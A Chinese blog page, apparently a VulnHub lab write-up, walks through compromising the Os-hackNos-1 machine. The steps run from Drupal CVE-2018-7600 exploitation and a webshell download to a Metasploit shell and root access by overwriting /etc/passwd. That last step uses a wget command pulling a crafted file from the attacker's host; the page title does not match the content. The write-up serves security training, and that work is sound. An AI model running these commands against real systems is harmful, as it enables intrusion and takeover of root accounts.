@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ICMP隧道模式使用 | mrfan6の博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="vulnhub靶机Os-hackNos-1一.靶机介绍Difficulty : Easy to Intermediate Flag : 2 Flag first user And second root Learning : exploit | Web Application | Enumeration | Privilege Escalation 详细链接以及下载链接: hackNos: Os-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICMP隧道模式使用">
+<meta property="og:url" content="https://mrfan6.github.io/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/index.html">
+<meta property="og:site_name" content="mrfan6の博客">
+<meta property="og:description" content="vulnhub靶机Os-hackNos-1一.靶机介绍Difficulty : Easy to Intermediate Flag : 2 Flag first user And second root Learning : exploit | Web Application | Enumeration | Privilege Escalation 详细链接以及下载链接: hackNos: Os-">
+<meta property="og:locale">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171056936.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171211146.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171320057.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171820592.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171919617.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172041708.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172229496.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172406014.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172529593.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173014650.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173215689.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173425377.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173538179.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130174030942.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130174111010.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130174329748.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130175451442.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130175911606.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180139503.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180322714.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180740507.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180813075.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181002793.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181234322.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181539122.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181654008.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181816936.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181918520.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130182009876.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130182056395.png">
+<meta property="article:published_time" content="2022-01-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-15T07:47:18.605Z">
+<meta property="article:author" content="mrfan6">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171056936.png">
+  
+    <link rel="alternative" href="/atom.xml" title="mrfan6の博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img src="../../../../../../../../../img/head.jpg" class="js-avatar show">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/HTML/index.html">火影页面</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
+                            
+                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 20px;">靶场</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>            
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/HTML/index.html">火影页面</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
+                    
+                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-vulnhub靶机Os-hackNos-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/" class="article-date">
+      <time datetime="2022-01-16T16:00:00.000Z" itemprop="datePublished">2022-01-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ICMP隧道模式使用
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+	<div class="article-entry" itemprop="articleBody">
+	      
+	        
+	            
+	        
+	        
+	        <h1 id="vulnhub靶机Os-hackNos-1"><a href="#vulnhub靶机Os-hackNos-1" class="headerlink" title="vulnhub靶机Os-hackNos-1"></a>vulnhub靶机Os-hackNos-1</h1><h2 id="一-靶机介绍"><a href="#一-靶机介绍" class="headerlink" title="一.靶机介绍"></a>一.靶机介绍</h2><p>Difficulty : Easy to Intermediate</p>
+<p>Flag : 2 Flag first user And second root</p>
+<p>Learning : exploit | Web Application | Enumeration | Privilege Escalation</p>
+<p>详细链接以及下载链接:</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/#description">hackNos: Os-hackNos ~ VulnHub</a></p>
+<h2 id="二-靶机搭建"><a href="#二-靶机搭建" class="headerlink" title="二.靶机搭建"></a>二.靶机搭建</h2><p>下载完镜像文件后使用vm打开即可,这里主要讲IP分配不到的问题（否则后续无法做下去）。</p>
+<h3 id="1-IP分配问题"><a href="#1-IP分配问题" class="headerlink" title="1.IP分配问题"></a>1.IP分配问题</h3><p>开机按住shift键即可 进入下面界面</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171056936.png" alt="image-20211130171056936"></p>
+<p>接着按住 键盘上的 E键 进入下图</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171211146.png" alt="image-20211130171211146"></p>
+<p>往下查找 找到 Linux 开头 ro结尾的字段</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171320057.png" alt="image-20211130171320057"></p>
+<p>修改 ro 字段 为 rw signie init=/bin/bash</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171820592.png" alt="image-20211130171820592"></p>
+<p>修改完后按住 Ctrl+X 进入下图界面</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130171919617.png" alt="image-20211130171919617"></p>
+<p>查看当前虚拟机中的网卡名字 ip a命令</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172041708.png" alt="image-20211130172041708"></p>
+<p>可以看到该靶场的网卡是ens33，lo是本地环回网卡，不用管它，直接看ens33</p>
+<p>接着修改网卡配置文件 vim /etc/network/interfaces</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172229496.png" alt="image-20211130172229496"></p>
+<p>可以看到该网卡与实际的不一样， 所以导致没有ip，这就是根源所在，所以直接修改为前面看到的网卡名字（ens33）即可</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172406014.png" alt="image-20211130172406014"></p>
+<p>重启网卡 /etc/init.d/networking restart  再看ip</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130172529593.png" alt="image-20211130172529593"></p>
+<p>已成功获取到IP地址 , 然后重启该主机就行了</p>
+<p>一般来说，vulnhub的靶场都要这样配置，否则直接扫该网段是扫不出该vulnhub的靶场的，因为都没IP地址，就别谈后面的主机发现了。</p>
+<h2 id="三-靶场攻略"><a href="#三-靶场攻略" class="headerlink" title="三. 靶场攻略"></a>三. 靶场攻略</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.22.1/24</span><br><span class="line">netdiscover -i eth0 -r 192.168.22.1/24   # -i 选择网卡</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173014650.png" alt="image-20211130173014650.png"></p>
+<p>可以扫描到vulnhub的IP地址为：192.168.22.11</p>
+<h3 id="2-端口探测"><a href="#2-端口探测" class="headerlink" title="2.端口探测"></a>2.端口探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p1-65535 192.168.22.11</span><br><span class="line">masscan -p1-65536 192.168.22.11 --rate=10000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173215689.png" alt="image-20211130173215689"></p>
+<h3 id="3-漏洞探测"><a href="#3-漏洞探测" class="headerlink" title="3.漏洞探测"></a>3.漏洞探测</h3><h4 id="3-1-ssh"><a href="#3-1-ssh" class="headerlink" title="3.1.ssh"></a>3.1.ssh</h4><p>22端口是ssh，所以先简单测试暴力破解</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173425377.png" alt="image-20211130173425377"></p>
+<p>尝试后没有用</p>
+<h4 id="3-2-http"><a href="#3-2-http" class="headerlink" title="3.2.http"></a>3.2.http</h4><p>接着尝试访问80端口 </p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130173538179.png" alt="image-20211130173538179"></p>
+<p>可以发现是一个apache的主页面，没什么作用点，接着就进行相应的目录扫描</p>
+<p>这里利用dirsearch</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130174030942.png" alt="image-20211130174030942"></p>
+<p>可以找到到一个目录地址 /drupal 进行访问</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130174111010.png" alt="image-20211130174111010"></p>
+<p>接着就可以利用该Drupal CMS 网上搜相应的漏洞进行尝试</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130174329748.png" alt="image-20211130174329748"></p>
+<p>最后通过测试<strong>drupa7-CVE-2018-7600.py</strong>  可以使用。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py">CVE-2018-7600/drupa7-CVE-2018-7600.py at master · pimps/CVE-2018-7600 · GitHub</a></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130175451442.png" alt="image-20211130175451442"></p>
+<p>该漏洞是一个命令执行，所以可以上传一个shell文件（利用wget命令进行下载），我这里就直接上传大马文件</p>
+<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="4-1-上传shell文件"><a href="#4-1-上传shell文件" class="headerlink" title="4.1.上传shell文件"></a>4.1.上传shell文件</h4><h5 id="①开启一个web服务"><a href="#①开启一个web服务" class="headerlink" title="①开启一个web服务"></a>①开启一个web服务</h5><p>我这里直接用python开启</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130175911606.png" alt="image-20211130175911606"></p>
+<p>大马文件与启动的位置保持一致，我这里放在了桌面上。</p>
+<h5 id="②利用命令执行漏洞进行下载"><a href="#②利用命令执行漏洞进行下载" class="headerlink" title="②利用命令执行漏洞进行下载"></a>②利用命令执行漏洞进行下载</h5><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180139503.png" alt="image-20211130180139503"></p>
+<p>可以观察到已经成功下载了，接下来就直接访问大马文件</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180322714.png" alt="image-20211130180322714"></p>
+<h4 id="4-2-MSF联动"><a href="#4-2-MSF联动" class="headerlink" title="4.2.MSF联动"></a>4.2.MSF联动</h4><p>接下来就是与MSF联动，因为该题目是找flag两个，另一个是在root的，所以考核的是提取手法。</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180740507.png" alt="image-20211130180740507"></p>
+<p>成功反弹到MSF上了</p>
+<h4 id="4-3-SUID提权"><a href="#4-3-SUID提权" class="headerlink" title="4.3.SUID提权"></a>4.3.SUID提权</h4><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130180813075.png" alt="image-20211130180813075"></p>
+<p>权限还是最低的，所以可以尝试相关提权手法，这里我就先尝试最简单的<strong>SUID提权</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181002793.png" alt="image-20211130181002793"></p>
+<p>可以观察到一个passwd，这里我就想到可以写入一个新用户并赋予root权限从而达到提权的目的</p>
+<h5 id="①先利用kali生成密码"><a href="#①先利用kali生成密码" class="headerlink" title="①先利用kali生成密码"></a>①先利用kali生成密码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd ‐1 ‐salt mrfan mrfan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181234322.png" alt="image-20211130181234322"></p>
+<p>/etc/passwd 字段 <strong>root</strong>权限形如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:密码:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>我添加的用户就是如下形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrfan:$1$mrfan$KhquGq.uZRnCMui.KH.lb.:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p>先输出当前vulnhub的密码（cat /etc/passwd）</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181539122.png" alt="image-20211130181539122"></p>
+<p>复制该字段信息并添加新用户字段 保存文本为1.txt</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181654008.png" alt="image-20211130181654008"></p>
+<p>同样的方法 利用wget进行覆盖原有密码</p>
+<h5 id="②开启一个web服务"><a href="#②开启一个web服务" class="headerlink" title="②开启一个web服务"></a>②开启一个web服务</h5><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181816936.png" alt="image-20211130181816936"></p>
+<p>此时该桌面是有上面保存的/etc/passwd以及新加入用户的字段信息的 且该文件名是1.txt 文本</p>
+<h5 id="③利用命令执行进行下载-并覆盖"><a href="#③利用命令执行进行下载-并覆盖" class="headerlink" title="③利用命令执行进行下载 并覆盖"></a>③利用命令执行进行下载 并覆盖</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.22.10:8888/1.txt -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130181918520.png" alt="image-20211130181918520"></p>
+<h5 id="④输出-etc-passwd-观察是否添加成功"><a href="#④输出-etc-passwd-观察是否添加成功" class="headerlink" title="④输出/etc/passwd 观察是否添加成功"></a>④输出/etc/passwd 观察是否添加成功</h5><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130182009876.png" alt="image-20211130182009876"></p>
+<p>成功添加了该用户字段</p>
+<h5 id="⑤直接上vulnhub进行验证"><a href="#⑤直接上vulnhub进行验证" class="headerlink" title="⑤直接上vulnhub进行验证"></a>⑤直接上vulnhub进行验证</h5><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211130182056395.png" alt="image-20211130182056395"></p>
+<p>成功提权到了root，实验就结束了，剩下的就是找flag了，就没什么可操作的了。</p>
+
+	        
+	      
+	    </div>
+	    
+	  </div>
+	  
+	    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">ICMP隧道模式使用</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2022年01月17日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年08月15日 - 15时47分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/" title="ICMP隧道模式使用">https://mrfan6.github.io/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://mrfan6.github.io/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2022/01/17/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Java网络编程
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+	  
+	</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1"><span class="toc-number">1.</span> <span class="toc-text">vulnhub靶机Os-hackNos-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E9%9D%B6%E6%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">一.靶机介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">二.靶机搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-IP%E5%88%86%E9%85%8D%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.IP分配问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E9%9D%B6%E5%9C%BA%E6%94%BB%E7%95%A5"><span class="toc-number">1.3.</span> <span class="toc-text">三. 靶场攻略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.漏洞探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-ssh"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">3.1.ssh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-http"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">3.2.http</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.4.</span> <span class="toc-text">4.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E4%B8%8A%E4%BC%A0shell%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">4.1.上传shell文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A0%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AAweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">①开启一个web服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A1%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">②利用命令执行漏洞进行下载</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-MSF%E8%81%94%E5%8A%A8"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">4.2.MSF联动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">4.3.SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A0%E5%85%88%E5%88%A9%E7%94%A8kali%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.4.3.1.</span> <span class="toc-text">①先利用kali生成密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A1%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AAweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.4.3.2.</span> <span class="toc-text">②开启一个web服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A2%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD-%E5%B9%B6%E8%A6%86%E7%9B%96"><span class="toc-number">1.3.4.3.3.</span> <span class="toc-text">③利用命令执行进行下载 并覆盖</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A3%E8%BE%93%E5%87%BA-etc-passwd-%E8%A7%82%E5%AF%9F%E6%98%AF%E5%90%A6%E6%B7%BB%E5%8A%A0%E6%88%90%E5%8A%9F"><span class="toc-number">1.3.4.3.4.</span> <span class="toc-text">④输出&#x2F;etc&#x2F;passwd 观察是否添加成功</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A4%E7%9B%B4%E6%8E%A5%E4%B8%8Avulnhub%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81"><span class="toc-number">1.3.4.3.5.</span> <span 